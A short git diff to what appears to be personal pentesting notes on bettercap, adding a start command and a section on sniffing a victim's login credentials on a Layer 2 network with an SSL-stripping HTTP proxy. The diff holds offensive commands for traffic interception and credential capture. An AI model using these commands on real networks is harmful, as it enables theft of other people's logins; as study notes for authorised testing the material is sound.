@@ -1,5 +1,10 @@
 # bettercap
-- Sniff victim lofin in to a Layer 2 Network
+- Start:
+```bash
+bettercap -iface _your_interface_
+```
+- - Sniffing of the victim login credentials a Layer 2 Network
+
 ```bash
 set http.proxy.sslstrip true
 set net.sniff.verbose false
